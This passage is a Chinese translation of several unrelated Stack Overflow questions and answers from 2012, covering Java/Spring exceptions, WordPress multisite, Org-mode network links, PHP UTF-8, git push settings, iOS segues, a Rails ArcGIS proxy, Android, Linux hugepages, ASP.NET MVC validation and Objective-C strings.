5.  由 TransactionRollbackException 引起

我尝试执行以下操作

```
public String merge()
  {
     try{
          //code to merge
        }
     catch(????? e){
         throw e;
     }
  } 
```

我试图在'????'中添加上述5个例外 . 但我还是抓不住。

谁能告诉我需要在'????'中添加哪个例外 从上面的列表中捕获异常？

PS：我正在使用 Spring ROO。所以我正在更改 .aj 文件中的代码。请不要关闭这个问题作为重复。在结束这个问题之前，我期待任何人对我的问题的回答。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T02:37:56.953

作为最后的手段，你可以抓住万能的[`exception`](http://docs.oracle.com/javase/6/docs/api/java/lang/Exception.html)

```
public String merge()
{
     try{
          //code to merge
        }
     catch(Exception e){
         //handle e here.
     }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T02:33:47.277

嗯，你不是只是在你的捕获中重新抛出异常吗？它应该是跟踪中的“最近”异常，所以`ConstraintValidationException`.

请注意，通常在 Spring/Hibernate 应用程序中，代码中冒泡的异常是导致事务回滚的原因。如果你捕捉到异常，你可能会阻止它，这可能会导致数据不一致。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-19T02:47:58.330

如有疑问，我会尝试捕获 Throwable 并添加断点或将其注销以查看它的确切含义。然后相应地更改代码。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-26T07:21:46.373

我最近有同样的问题。似乎spring wrap异常在它自己的异常类中。
我解决了这个问题：

```
try {
   ...
}
catch(Exception e){
  System.out.println(e.getClass().getName());
} 
```

这样你就会发现真正抛出了什么异常；

# wordpress - 1 wordpress 安装 2 个域

> ID：11553122
> 
> 赞同：1
> 
> 时间：2012-07-19T02:32:14.947
> 
> 标签：wordpress, url, dns

我在 domain1.co.uk 安装了一个 wordpress。

我有另一个域 (domain2.com)，并且我更改了 A 记录，以便它现在指向 domain1.co.uk 上的安装，同时保留 domain2.com URL。

我的问题是当我单击 wordpress 站点中的任何链接时，URL 更改为 domain1.co.uk/pagename 并且不保留 .com。我知道 wordpress 站点地址目前设置为 domain1.co.uk，但我希望能够在从 domain2.com 访问整个站点时保留 domain2.com。

那可能吗？

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:54:25.943

您要么必须以某种方式使用 wpmu（wordpress 多站点已集成到 wordpress 中），要么您可以启用 wordpress（多站点功能）[http://codex.wordpress.org/Create_A_Network]。

这很简单：

```
// wp-config.php
define('WP_ALLOW_MULTISITE', true); 
```

然后转到网络设置工具，在配置中添加一些行，在 htaccess 中添加一些行，并创建一个上传目录。

# windows - 链接到 Windows 网络共享上的文件

> ID：11553123
> 
> 赞同：2
> 
> 时间：2012-07-19T02:32:18.113
> 
> 标签：windows, emacs, org-mode, network-share

如何从 Org 模式链接到 Windows 环境中网络驱动器上的文件？

我得到错误：

> eval: ShellExecute failed: 系统找不到指定的文件。

通过这种链接：

> [[//share/path/to/file.csv]]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-24T19:34:33.407

我也有同样的问题。我将其追溯到*org-open-at-point*将 PATH 转换为*w32-shell-execute*无法打开的东西。使用下面的 defadvice，我可以打开 // 和 \ 网络路径。

```
(defadvice w32-shell-execute (around 
                              workaround-for-org-w32-shell-execute
                              activate)
  "Replace w32-shell-execute PATH directory seperators to Windows
backslash when PATH starts with '//' (i.e. Network path). This
allows allowing org-mode links in org-mode files like
[[\\\\myserver\\mypath\\mydoc.doc][mydoc.doc]] to be opened by
org-open-at-point. Forward slashes / are also accepted.

org-open-at-point transforms the links to //../../ but
unfortunately w32-shell-execute does not accept that."
  (let ((operation (ad-get-arg 0))
        (path      (ad-get-arg 1)))
    (when (and (string-equal operation "open")
               (eql (string-match "//" path 0) 0))
      (setq path (replace-regexp-in-string "/" "\\\\" path))
      ;; debug (message "Opening %s" path)
      (ad-set-arg 1 path))
    ad-do-it)) 
```

试试 [[//127.0.0.1/c$$]]

这是一个快速而肮脏的修复，但“它适用于我的机器”。

在 Emacs 24.2、组织模式 7.9.11 上验证。

编辑：当我将以下关联添加到 org-mode 时，关于“但是，对我来说一个重要的用例是打开其他类型的文件（例如 MS Office 文件）”的评论对我有用。我可以使用 [[\server\share\piyo.doc]] 等普通 org-mode url 打开 Microsoft Word、Excel 等

```
(mapc (lambda (file-name-matcher)
    (add-to-list 'org-file-apps
                 (cons file-name-matcher 'default) 'append))
  (list "\\.doc\\'"
        "\\.xls\\'"
        "\\.ppt\\'")) 
```

编辑：关于“[[file+sys:]]”的注释是“open [a file] via OS, like double-click”，可以通过上面的关联来实现。在我的 Windows 计算机上，我不需要“[[file+sys:]]”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T03:48:54.973

Windows 的某些部分和某些 Windows 应用程序不支持 UNC 路径。Emacs 可以，但看起来您（或 org-mode）正在尝试执行某些程序，而不是简单地使用 find-file 在 Emacs 中查看文件。解决方法是安装`//share/path`为`X:`并`[[X:/to/file.csv]]`用作您的链接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T21:42:51.787

如果您的 UNC 路径碰巧包含与远程磁盘驱动程序相关的管理共享之一（如 \server\c$ 或 \server\d$，则需要​​将磁盘字母后的 $ 加倍，以便它们看起来像 \server \c$$ 或 \server\d$$

# php - 字符编码失败，为什么\xBD在PHP + HTML中显示不正确

> ID：11553124
> 
> 赞同：2
> 
> 时间：2012-07-19T02:32:23.633
> 
> 标签：php, utf-8, character-encoding

我只是想更好地理解字符编码，所以我正在做一些测试。

我有一个保存为 UTF-8 的 PHP 文件，如下所示：

```
<?php
declare(encoding='UTF-8');

header( 'Content-type: text/html; charset=utf-8' );
?><!DOCTYPE html>

<html>

<head>
    <meta charset="UTF-8" />
    <title>Test</title>
</head>

<body>
    <?php echo "\xBD"; # Does not work ?>
    <?php echo htmlentities( "\xBD" ) ; # Works ?>
</body>

</html> 
```

页面本身显示了这一点：

![在此处输入图像描述](../Images/7e70bff88e4b40561f9e2764a4b05b73.png)

问题的要点是我的 Web 应用程序有一堆字符编码问题，人们从 Outlook 或 Word 复制和粘贴，字符被转换成菱形问号（这些有真实姓名吗？）

我正在尝试学习如何确保在页面加载时我的所有输入都转换为 UTF-8（基本上`$_GET`是 、`$_POST`和`$_REQUEST`），并且所有输出都是使用正确的 UTF-8 处理方法完成的。

* * *

我的问题是：为什么我的页面会显示第一个回显的问号，是否有人知道有关在 PHP 中制作 UTF-8 安全 Web 应用程序的任何其他信息？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T02:40:55.853

0xBD 不是有效的 UTF-8。如果要在 UTF-8 中编码“½”，则需要使用 0xC2 0xBD 代替。

```
>>> print '\xc2\xbd'.decode('utf-8')
½ 
```

如果您想使用来自另一个字符集的文本（在这种情况下为拉丁语 1），那么您需要首先使用各种 iconv 或 mb 函数将其转码为 UTF-8。

还：

```
$ charinfo �
U+FFFD REPLACEMENT CHARACTER 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T02:41:09.927

`\xBD`无效，因为您想要的是 utf8 `\xC2\xBD`，问号是应用程序替换无效代码点的内容，因此，如果您在 utf8 文本中看到它不是 utf8 或已损坏。

# json - 从 db live 加载数据

> ID：11553127
> 
> 赞同：0
> 
> 时间：2012-07-19T02:32:52.400
> 
> 标签：json

我正在尝试弄清楚如何实时更新 ul li 列表。

假设：我们有一个无序列表，每个 li 元素都从最新到最旧显示。我正在寻找一种方法，轮询服务器以获取更新，并将该更新推送到列表（可能使用 jSon）实时并且不刷新页面。

例子。

```
<ul>
<li>12 seconds ago: Apple</li>
<li>32 seconds ago: Banana</li>
<li>42 seconds ago: Grape</li>
</ul>

<ul>
<li>2 seconds ago: Pineapple</li>
<li>22 seconds ago: Apple</li>
<li>32 seconds ago: Banana</li>
<li>52 seconds ago: Grape</li>
</ul> 
```

所以如果我们只是盯着页面，就像一个悲伤的失败者。该列表每隔 x 秒自动上传一次来自服务器的最新数据。

我只是想要一些关于寻找这种东西的指示，以及我们真正应该寻找的东西。

不确定从服务器推送数据是否比从服务器拉取数据更好，我想推送会减少过载。

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:59:17.503

一种可能的解决方案是使用 XMLHttpRequest 轮询服务器以获取 JSON。您的客户端 JavaScript 如下所示：

```
setInterval(updateList, 5000); // run updateList() every 5 seconds

// This assumes you're using jQuery
// You can still do this without jQuery, it just makes things easier
function updateList()
{
    $.getJSON('<<URL to your JSON producing script here>>', function(data) {
        var items = [];

        $.each(data, function(fruit, time) {
            items.push('<li>' + time + ' seconds ago: ' + fruit + '</li>');
        });

        $('#my-list').html(items.join(''));
    });
} 
```

您的 HTML 可能如下所示：

```
<ul id='my-list'>
</ul> 
```

最后，您的 JSON 应遵循以下格式：

```
{
    'Pinapple' : 2,
    'Apple' : 22,
    'Banana' : 42,
    'Grape' : 52,
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-02T07:36:13.837

现在实际上有一个 SAAS 应用程序可以简单快速地执行此操作，因此您不必硬编码并且可以节省时间： [Json Data](http://jsondata.com)

# python - 使用 Python 在 linux 中获取系统音量（声级）

> ID：11553131
> 
> 赞同：0
> 
> 时间：2012-07-19T02:33:32.963
> 
> 标签：python, linux, audio, volume

我正在使用 Fedora 16 并在 python 2.7 中修改程序。

如何获取系统音量（声级）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T05:06:29.060

For ALSA, use [`pyalsaaudio`](http://pyalsaaudio.sourceforge.net/libalsaaudio.html#mixer-objects)

For Pulse, its a bit raw. There are [ctype bindings](https://github.com/Valodim/python-pulseaudio)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T03:12:14.690

如果您使用 ALSA，您可以运行“amixer”来转储所有音量控制的状态。对于 PulseAudio，我相信“pacmd dump”应该得到类似的信息。（见[http://blog.waan.name/pulseaudio-setting-volume-from-command-line/](http://blog.waan.name/pulseaudio-setting-volume-from-command-line/)）

# git - 'git远程显示 ' 不服从 'config push.default'

> ID：11553136
> 
> 赞同：2
> 
> 时间：2012-07-19T02:33:53.960
> 
> 标签：git

我需要有一个本地分支拉动并推送到一个不同名称的远程分支。克隆和获取后会自动设置拉取。但是推的有点重。我想要这个：

```
git push <remote> <localBranch>:<remoteBranch> 
```

无需担心`local:remote`每次。[多亏了这篇博文](http://longair.net/blog/2011/02/27/an-asymmetry-between-git-pull-and-git-push/)，我才完成了所有工作。

因此，正如博客所解释的，我将全局配置设置为默认使用“上游”选项。例如：

```
git config --global push.default upstream 
```

它正确地将本地分支推送到远程分支`git push <remote>`。

但是，当我`git remote -v show <remote>`使用默认的 master 分支作为上游的远程操作时，我得到以下信息：

```
* remote <remote>
  Fetch URL: <giturl>
  Push  URL: <giturl>
  HEAD branch: master
  Remote branch:
    master tracked
  Local branch configured for 'git pull':
    myLocalBranch merges with remote master
  Local ref configured for 'git push':
    master pushes to master (local out of date) 
```

为什么它仍然报告本地'master'分支作为推送源？它甚至说过时了（如果使用本地“主人”，那就是过时了）。除了做`git push <remote>`结果，`Everything up-to-date`它肯定是`myLocalBranch`正确使用的。

我是不是误会了什么？这是 git remote show 命令中的错误吗？还是我的配置进入了一个奇怪的状态？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T06:56:50.053

实际上，OP 有一种错误的印象，即 ' `git remote`' 提到 master 作为`myLocalBranch`正在推送的分支。

这不是真的：所显示的只是本地`master`正在推送到远程`master`（可能在 repo 的初始克隆期间设置）。

`branch.myLocalBranch.merge`特定于的配置`myLocalBranch`未在`git remote`.

# ios - ios - 将一个 UIButton 连接到 2 个 segues

> ID：11553141
> 
> 赞同：9
> 
> 时间：2012-07-19T02:34:11.967
> 
> 标签：ios, storyboard

我有一个 UIButton，我正在尝试将它连接到两个 segue。使用哪种 segue 取决于许多条件。

例如，当按下 UIButton（标题为“next”）时，

> *如果（条件 1）然后转到屏幕 A。否则转到屏幕 B。*

我相信我的代码是正确的（无论如何我已经包含了它），但问题是在故事板视图中，我可以使用 segue 将一个按钮连接到一个视图控制器。我该如何解决 ？

这是我正在使用的代码 -

```
-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender{
        if([[segue identifier]isEqualToString:@"nextButtonID"]){
            creditCardViewController *cvc = [segue destinationViewController];
        }
        else if([[segue identifier]isEqualToString:@"next2ButtonID"]){
            depositInfoViewController *divc = [segue destinationViewController];
        }
}

-(IBAction)nextClicked{
        if([accountType isEqualToString:@"patron"]){
            [self performSegueWithIdentifier:@"nextButtonID" sender:self];
        }
        else{
            [self performSegueWithIdentifier:@"next2ButtonID" sender:self];
        }
} 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-07-19T02:37:26.963

在情节提要窗口中，从视图底部的视图控制器图标控制拖动并将其拖动到目标视图控制器，给 segue 一个标识符，然后重复下一个 segue。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-02-19T11:25:00.487

`prepareForSegue`除非您想将一些数据传递给其他视图控制器，否则您不需要提及任何代码

```
-(IBAction)nextClicked
{  
    if ([strCheck isEqualToString:@"launch Screen A"])
        {
            UIStoryboard *storyboard=[UIStoryboard storyboardWithName:@"Main" bundle:[NSBundle mainBundle]];

            ScreenA *screenA = (ScreenA *)[storyboard instantiateViewControllerWithIdentifier:@"ScreenA"];
            [self.navigationController pushViewController:screenA animated:NO];

        }
        else
        {

            UIStoryboard *storyboard=[UIStoryboard storyboardWithName:@"Main" bundle:[NSBundle mainBundle]];

            ScreenB *screenB = (ScreenB *)[storyboard instantiateViewControllerWithIdentifier:@"ScreenB"];

            [self.navigationController pushViewController:screenB animated:NO];

        }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-02-19T11:41:32.760

我经常这样做。我的方法是制作两个“手动”segues。

*   在界面生成器中 ctrl+从 View Controller 1 拖动到 View Controller 2
*   在 IB 中单击此 segue 并转到属性并将其命名为标识符：**nextButtonID**
*   创建第二个 segue 并按照相同的步骤将其命名为**next2ButtonID**

那么我认为你的代码应该可以正常工作。我遇到了一个问题，我有一个从按钮开始的转场 - 然后 - 我也试图调用一个不同的转场。通过将这些设置为通用的“控制器到控制器”序列，它们被设置为在您执行操作时手动调用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-09-29T23:43:59.330

在**斯威夫特 3**中：

在情节提要中，按 ctrl+拖动以创建从`SourceViewController`到`DestAViewController`和的转场`DestBViewController`，并为每个转场指定一个标识符（例如“ToDestA”和“ToDestB”）。然后：

```
 @IBAction func onButton(_ sender: Any) {
    if (testForA){
        self.performSegue(withIdentifier: "ToDestA", sender: Any?)
    } else {
        self.performSegue(withIdentifier: "ToDestB", sender: Any?)
        }
    } 
```

# ios - 使用 UIImage 进行操作

> ID：11553144
> 
> 赞同：0
> 
> 时间：2012-07-19T02:34:31.220
> 
> 标签：ios, image, cocoa-touch, uiimageview, uiimage

我有一个问题`UIImage`。

```
- (UIViewController *)pageViewController:(UIPageViewController *)pageViewController
   viewControllerAfterViewController:(UIViewController *)viewController{

    NSUInteger currentIndex = [self.modelArray indexOfObject:[(ContentViewController *)viewController labelContents]];
    if(currentIndex == self.modelArray.count-1)
    {
        return nil;
    }    ContentViewController *contentViewController = [[ContentViewController alloc] init];
    contentViewController.labelContents = [self.modelArray objectAtIndex:currentIndex + 1];
    if(currentIndex > 0)
    {
        [[contentViewController firstimage] setImage :nil];
    } else if (currentIndex == 0) {
        contentViewController.firstimage_.image = [UIImage imageNamed:@"image.png"];
    }
    return contentViewController;
} 
```

所以想法是：当应用程序启动时，它会显示一个图像。但是当我转到不是第一个的页面时，图像将不会显示。

我尝试将图像设置为`nil`，传递另一个图像，还有很多方法，但我在每一页上仍然有相同的图像！

请指教我做错了什么？

# css - 为什么 Div 标签在 Mozilla 和 IE 中不起作用？

> ID：11553145
> 
> 赞同：0
> 
> 时间：2012-07-19T02:34:32.233
> 
> 标签：css

下面给出的代码不能在 mozilla 和 Internet Explorer 中运行，但可以在 google chrome 中正常运行。我使用了wordpress网站主页的索引模板中的代码。

代码：

```
<h1>
    <div  style=" background: #808080;" align="center" >
    Welcome to Braddocks blog. Free dating advice from a world famous Dating Coach!
    </div>
</h1> 
```

请让我知道是什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T02:37:59.227

`<div>`里面无效`<h1>`。相反，只需将必要的属性应用于标题：

```
<h1 style="background: #808080; text-align: center;">Welcome to...</h1> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T02:42:50.907

div 和 h1 都是块级元素，不需要将 h1 外部添加到 div，所以试试这个：

```
<div  style="display:block; background: #808080;text-align:center;">
    Welcome to Braddocks blog. Free dating advice from a world famous Dating Coach!
</div> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T02:43:54.913

在 Firefox 中对我来说效果很好。不过前面的答案是正确的。h1 必须在 div 内（对于 seo，每页应该只有一个 h1）。`text-align:center`在 div 和 div上执行 a以使`margin: 0 auto`div 居中。如果要将 h1 内的文本左对齐`text-align: left`，请在 h1 上放置 a。我不鼓励内联样式。

```
<div style="background: #808080; text-align: center; margin: 0 auto;" >
    <h1>Welcome to Braddocks blog. Free dating advice from a world famous Dating Coach!</h1>
</div> 
```

# ruby - 使用 Rails 转发未经处理的多部分 HTTP 请求

> ID：11553154
> 
> 赞同：2
> 
> 时间：2012-07-19T02:35:28.660
> 
> 标签：ruby, http, ruby-on-rails-3.2, arcgis-server, actiondispatch

好吧，这有点难以解释，所以请多多包涵……

我有一个 Rails 应用程序，其中包含为 ESRI ArcGIS javascript API 编写的大型 javascript 代码库，用于与存储在 ESRI ArcGIS Server 上的空间数据进行交互。ESRI ArcGIS javascript API 使用通常称为“ArcGIS Server 代理”的东西将请求转发到需要基于令牌的身份验证或太长而无法在 URL 中直接处理的 ArcGIS Server 服务。AGS 代理只需向传递给它的 URL 发出 HTTP 请求，将与原始请求一起传递的任何附加参数转发到 ArcGIS Server 服务，该服务执行实际繁重的工作并以 JSON 响应。有关 AGS 代理的详细信息，请参阅 ArcGIS 资源中心的以下[页面](http://help.arcgis.com/en/webapi/javascript/arcgis/help/jshelp_start.htm#jshelp/ags_proxy.htm)。

鉴于 AGS 代理仅由 ESRI 在 ASP.Net、Java 和 PHP 风格中提供，我冒昧地将 AGS 代理编写为 Rails 控制器。我选择采用这种方法是因为 JSAPI 不支持跨域请求，并且出于托管原因，我不想在我的 Rails 应用程序中提供 PHP 或在 JRuby 之上运行我的应用程序。我的 Rails AGS 代理在我目前遇到的所有情况下都可以工作，除了多部分请求，它与附件编辑器功能一起发生，[这里说明了](http://help.arcgis.com/en/webapi/javascript/arcgis/help/jssamples/ed_attachments.html)。

在尝试使多部分请求工作时，我选择使用 Faraday 向 ArcGIS Server 服务发出 HTTP 请求，因为 Faraday 的简单性和对多部分请求的支持。我尝试执行多部分请求的代码如下：

```
# Configure the request
uri = URI.parse(url)
conn = Faraday.new(:url => ("http://" + uri.host.downcase)) do |faraday|
  faraday.request :multipart
  faraday.request :url_encoded
  faraday.response :logger
  faraday.adapter Faraday.default_adapter
end

# Make request
response = conn.post uri.path do |req|
  req.body = agsparams
end 
```

“agsparams”变量是传递给 ArcGIS Server 的参数散列。

尝试执行此代码时，在发出实际请求的行上出现 Ruby 错误，并出现以下错误，这是我目前遇到的问题：

```
NoMethodError (undefined method `local_path' for #ActionDispatch::Http::UploadedFile:0x007ffbe198fe60 
```

当我在控制器中转储 params 哈希时，它看起来类似于以下内容：

```
{
   "attachment"=>#ActionDispatch::Http::UploadedFile:0x007ffbe198fe60
   @original_filename="test_image.jpg",
   @content_type="image/jpeg",
   @headers="Content-Disposition: form-data; name=\"attachment\"; filename=\"test_image.jpg\"\r\nContent-Type: image/jpeg\r\n",
   @tempfile=#File:/var/folders/mh/2mfy5nr54gngrzg06gzp1jcw0000gn/T/RackMultipart20120718-2772-xwbgjy,
   "f"=>"json",
   "http://arcgisserver.com/arcgis/rest/services/multitenant/test_organization/FeatureServer/0/4808/addAttachment"=>nil
} 
```

（我删除了一些括号，以便在 StackOverflow 上显示。）

我不知道在哪里调用了“local_path”方法，因为我没有调用它，但我猜这是某种与我不理解的 ActionDispatch 相关的内置功能。ActionDispatch 中是否有我需要覆盖的方法，如果有，我该怎么做？我有一种预感，当我真的只想将文件输入参数转发到 ArcGIS Server 以便 ArcGIS Server 进行上传时，ActionDispatch 正在尝试上传我指定的文件。我不认为我想使用 Faraday::UploadIO，因为我认为我只需要将参数转发到 ArcGIS Server，但我可能是错的。我从这里去哪里？？

作为一些额外的尽职调查，我已经确认我的映射 javascript 可以与其他风格的 AGS 代理一起使用；我还检查了使用 Wireshark 工作的多部分代理请求，并将这些请求与使用我的 Rails AGS 代理发出的请求进行了比较，它们看起来是一致的（标头和参数看起来正确）。我尝试添加附件的数据实际上已正确配置为接受附件。我被困住了，真的可以使用一些帮助。

关于我的环境的一些信息：我的应用程序是在 Ruby 1.9.2 上用 Rails 3.2 编写的（我目前使用 CarrierWave 和 Fog 来处理应用程序其他非映射部分的附件，如果这很重要的话）。我正在尝试通过 ArcGIS JSAPI 2.8/Dojo 1.6 发布到运行 ArcGIS Server 10.1 的服务器。

提前致谢...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-06T23:52:37.863

差点忘了这个问题。我最终通过重写要使用的请求并在需要执行多部分请求时 `Net::HTTP`使用[multipart-post gem来解决这个问题。](https://github.com/nicksieger/multipart-post)`Net::HTTP::Post::Multipart`接受一个`UploadIO`对象，所以我只需打开附件临时文件并将其用作我的 POST 请求中的参数。问题解决了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-16T20:45:33.293

我知道我参加聚会有点晚了，但我想我应该在这里发布以供参考。

我目前正在开发一个项目，该项目使用 Rails 作为外部 API 服务器的中间件。我们的 Rails 服务器从客户端接收到的许多请求都只是经过验证、身份验证，并提供了适当的标头以访问外部 API。自然，我一直在使用 Faraday 向 API 发出请求并遇到了这个问题（特别是图像上传）。我找不到通过未经处理的方式传递请求的方法，但我能够单独使用 Faraday 传递请求，并使用`Faraday::UploadIO`对象通过 Rails 代理图像数据将其传递给外部 API。我在这里创建了一个 GitHub Gist：

[https://gist.github.com/mjquinlan2000/10929611](https://gist.github.com/mjquinlan2000/10929611)

# java - 通过 XML 设置 ListView 的背景颜色

> ID：11553156
> 
> 赞同：3
> 
> 时间：2012-07-19T02:35:37.567
> 
> 标签：java, android, xml, eclipse

我知道我可以通过以下代码的一些变体动态设置 ListView 的背景颜色：

```
ListView mainListView;  
mainListView = (ListView) findViewById( R.id.listView1 );
mainListView.setBackgroundColor(Color.BLACK); 
```

但是，我想通过 XML 来做同样的事情。我没有任何运气地尝试了以下代码（它没有改变）：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent">
    <ListView
        android:id="@+id/listView1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        **android:background="#FFFFFF"**
        android:layout_centerHorizontal="true"
        android:layout_centerVertical="true" >
    </ListView>
</RelativeLayout> 
```

有谁知道通过 XML 更改 ListView 的背景颜色的简单方法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-19T02:45:43.700

你可以这样做：

> 您必须在项目的 res/value 文件夹中创建 Color.xml 文件。Color.xml 的代码是

```
<?xml version="1.0" encoding="utf-8"?>
<resources>
 <color name="orange">#ff5500</color>
 <color name="white">#ffffff</color>
 <color name="transparent">#00000000</color>
 <color name="date_color">#999999</color>
 <color name="black">#000000</color>
 <color name="gray">#999999</color>
 <color name="blue">#0066cc</color>
 <color name="gold">#e6b121</color>
 <color name="blueback">#99FFFF</color>
 <color name="articlecolor">#3399FF</color> 
 <color name="article_title">#3399FF</color> 
 <color name="cachecolor">#8ad0e8</color>
</resources> 
```

[Android 颜色 xml 资源文件中的 Web 颜色](https://stackoverflow.com/questions/3769762/android-color-xml-resource-file)

或者，试试这个：

```
android:background="@android:color/holo_green_light" 
```

这些颜色：

[http://developer.android.com/reference/android/R.color.html](http://developer.android.com/reference/android/R.color.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T02:43:35.823

“#ffffff”应该可以工作。但你也可以使用：android:background="@android:color/black"

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T02:58:52.927

由于列表项有多种状态（按下、聚焦、选择等），因此最好使用选择器 xml，而不是使用单一颜色。请参阅[开发文档](http://developer.android.com/guide/topics/resources/drawable-resource.html#StateList)和此[堆栈溢出问题](https://stackoverflow.com/questions/2038040/android-listview-selector-color)以供参考。创建选择器后，将其设置为 android:background。

# linux - Linux x86 64 是否同时具有 2M 和 4K 页面？

> ID：11553158
> 
> 赞同：2
> 
> 时间：2012-07-19T02:35:58.570
> 
> 标签：linux, kernel

我的内核是

```
Linux localhost.localdomain 2.6.30 #5 SMP Tue Aug 10 00:56:36 CST 2010 x86_64 x86_64 x86_64 GNU/Linux 
```

我的内核模块在 nr_hugepages 被禁用时找到了一个 2M 页面。

```
 [root@localhost ~]# cat /proc/sys/vm/nr_hugepages
0

[root@localhost ~]# cat /proc/meminfo
...
Hugepagesize:       2048 kB
DirectMap4k:        9856 kB
DirectMap2M:     2052096 kB 
```

我想知道linux64内核是否可以同时拥有2M和4K页面？还有什么条件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T02:42:02.850

是的。我相信您需要使用特殊的内核设置来构建以支持大页面大小，然后分配您希望的 #/huge 页面（其余内存将是常规的 4K 页面）。

以下是链接：

*   [http://unixfoo.blogspot.com/2007/10/hugepages.html](http://unixfoo.blogspot.com/2007/10/hugepages.html)

*   [http://dbakerber.wordpress.com/2012/03/14/configuring-hugepages-for-oracle-on-linux/](http://dbakerber.wordpress.com/2012/03/14/configuring-hugepages-for-oracle-on-linux/)

*   [http://lwn.net/Articles/374424/](http://lwn.net/Articles/374424/)

# asp.net-mvc - MVC4：从服务器端手动设置验证消息

> ID：11553159
> 
> 赞同：6
> 
> 时间：2012-07-19T02:36:06.090
> 
> 标签：asp.net-mvc, validation

我想验证服务器端的一些表单字段，但我不想使用数据注释自定义验证器。我需要根据调用的业务层方法的返回手动设置它的值来定义这个消息。

就像一个例子！

需要：

如果给定的用户名已经存在，则 MVC4 验证错误范围应显示“此用户名已存在”。

代码：

```
 if (_business.UserNameExists(username))
 {
    // Set the field validation error span message
    // HOW TO DO??
 } 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-28T21:06:44.580

朋友来了解决办法，很简单！

```
 if (_business.UserNameExists(username))
 {
    // Set the field validation error span message
    ModelState.AddModelError("UserName", "This username already exists.");
 } 
```

其中 UserName 是要验证的实体属性的名称。

# objective-c - ARC 和非 ARC NSString 初始化

> ID：11553164
> 
> 赞同：2
> 
> 时间：2012-07-19T02:37:12.207
> 
> 标签：objective-c, ios, cocoa-touch, nsstring, automatic-ref-counting

最近，我一直在我的 Objective-C/iOS 程序中使用自动引用计数，并且真的很喜欢这个功能。

我不明白的一件事是初始化`NSString`. 我已经看到这种方法用于 ARC 和非 ARC 项目：

```
NSString *myClassicString = [[NSString alloc] initWithFormat:@"My great non-ARC string!"]; 
```

我还发现以下方法可以用于`NSString`在 ARC 中初始化一个，我更喜欢它，因为它很方便：

```
NSString *myARCString = [NSString stringWithFormat:@"My new simple initialization string!"]; 
```

这两者有什么区别吗？有正确的方法吗？哪一个更好？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T02:45:35.557

在 ARC 之前，两种方法之间存在显着差异。第一个是`alloc` `init`方法，它产生了一个由调用者拥有的对象——它必须手动释放，否则会出现内存泄漏。另一种`+stringWithFormat:`是一种方便的方法，它产生一个不需要显式释放的自动释放对象。

对于 ARC，这种差异仍然很大。自动释放的对象仍然堆积，因为自动释放池仅在运行循环的每个周期都被耗尽，即使使用 ARC，所以如果你有一个循环创建大量自动释放的对象（即它们使用 NSString 便利方法或其他方法），你的峰值内存足迹可能会增加。`-alloc -init`出于这个原因，使用该版本会更好。除此之外，与ARC几乎没有区别。

[这个答案](https://stackoverflow.com/questions/2498330/when-is-an-autoreleased-object-actually-released)很好地解释了自动释放池在这里发生的事情，Jon 谈到的概念仍然适用于 ARC 代码，因为 ARC 没有摆脱`-retain`,`-release`和`-autorelease`，它只是插入那些内存管理代码你。

话虽如此，您可能不必担心两种创建字符串的方法之间的区别。无论哪种方式对您来说感觉更好，并且使代码更简洁易读，都是更好的方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T02:44:00.810

任何一个都很好。如果您手动管理内存，它们的处理方式会有所不同，但如果您使用的是 ARC，这些都不重要。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-19T02:44:05.877

两种方法都是一样的。`NSString`在初始化方面没有一个比另一个更好。

# c# - 如何更改合并数据集的背景行颜色？

> ID：11553165
> 
> 赞同：0
> 
> 时间：2012-07-19T02:37:19.747
> 
> 标签：c#

我将几个数据集合并（）到一个主数据集中，如下所示：

```
maindataset.Tables[0].merge(other1DataSet.Tables[0])
maindataset.Tables[0].Merge(other2DataSet.Tables[0]) 
```

我让它显示在一个数据网格（maindatagrid）中。有没有办法为数据集的每一行指定颜色？

目前我可以使 maindatagrid 行像这样着色：

```
foreach(UltraGridRow row in maindatagrid.Rows)
{
row.CellAppearance.BackColor = color.lightblue
} 
```

我想为每个数据网格着色，但指定合并的数据网格在上面的代码中不起作用。任何人都知道更改每个数据网格的行颜色的更好方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T02:52:22.300

尝试使用单元格样式变量这样做

```
